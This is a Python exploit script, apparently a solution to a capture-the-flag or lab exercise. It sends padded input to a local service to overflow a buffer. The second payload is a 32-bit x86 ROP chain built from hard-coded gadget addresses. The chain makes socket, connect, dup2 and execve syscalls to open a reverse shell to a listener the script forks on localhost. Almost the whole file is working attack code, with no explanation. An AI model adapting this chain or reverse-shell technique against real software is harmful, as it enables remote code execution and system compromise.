#!/usr/bin/env python

from struct import pack
from console import console
import os
import socket
import sys
import time

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT CONNECT_PORT" % sys.argv[0])

def send_cmd(cmd1, cmd2):
    port = int(sys.argv[1])
    sock = socket.create_connection(('127.0.0.1', port),
                                    socket.getdefaulttimeout(),
                                    ('127.0.0.1', 0))

    sock.sendall(cmd1)

    #while True:
    #	 buf = sock.recv(1024)
    # 	 if not buf:
    #		break
    #    	sys.stdout.write(buf)
    #sock.close()
    time.sleep(1)
    sock.sendall(cmd2)
    buf = sock.recv(4096)
    sys.stdout.write(buf)
    sys.stdout.flush()
    sock.close()

def parent():

	#first command of 1023 chars
	cmd1 = ""
	pad = "a"

	for x in range(0, 1023):
		cmd1 = "".join((cmd1, pad))

	#second command of 29 to reach 1052 and start writing first gadget's address
	p = ""

	for x in range(0, 29):
		p = "".join((p, pad))


	#socket(int, int, int);
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x2)	    # PF_INET = AF_INET
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139064) # @ .data + 4
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x1)	    # SOCK_STREAM
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x6)	    # IPPROTO_TCP
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x1)	    # SYS_SOCKET
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x66)	    # 0x66 <-> sys_socketcall
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#connect(int, struct sockaddr *, socklen_t)
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139060) # @ .data
	#eax already has sock fd
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139064) # @ .data + 4
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x10)	    # 16
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret

	#populating struct addr * 
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x0813906c) # @ .data + 12
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x2)	    # AF_INET
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x0813906e) # @ .data + 14
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', socket.htons(int(sys.argv[2]))) # htons(connect_port)
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139070) # @ .data + 16
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += socket.inet_aton('127.0.0.1') # inet_aton(localhost)
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret

	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139060) # @ .data

	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x3)	    # SYS_CONNECT
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x66)	    # 0x66 <-> sys_socketcall
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#dup
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x0)
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x29)	    # 0x29 <-> dup
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#close
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x0)
	p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x06)	    # 6
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#ebx has sock+1
	p += pack('<I', 0x08134226) # dec ebx ; ret

	#dup2(sock, 0)
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x0)	    # 0
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#dup2(sock, 1)
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x1)	    # 1
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret

	#dup2(sock, 2)
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x2)	    # 2
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
	p += pack('<I', 0x08085cc0) # int 0x80 ; ret
	
	#shell
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139064) # @ .data + 4
	p += pack('<I', 0x080f1016) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
	p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481e1) # pop ebx ; ret
	p += pack('<I', 0x08139060) # @ .data
	p += pack('<I', 0x0812b35b) # pop ecx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x0808522a) # pop edx ; ret
	p += pack('<I', 0x08139068) # @ .data + 8
	p += pack('<I', 0x080f1015) # inc eax ; pop eax ; ret
	p += pack('<I', 0xb) # 11, execve syscall id
	p += pack('<I', 0x08074ded) # int 0x80

	send_cmd(cmd1, p)

def child():

	s = socket.socket()
	s.bind(("127.0.0.1", int(sys.argv[2])))
	s.listen(10)
	s_rev, addr = s.accept()
	console(s_rev)
	while True:
		buf = s_rev.recv(4096)		
		sys.stdout.flush()
		if not buf:
			break


child_pid = os.fork()

if(child_pid == 0):
	child()
	sys.exit(0)
else:
	parent()
	os.waitpid(child_pid, 0)

# :vim set sw=4 ts=8 sts=8 expandtab:
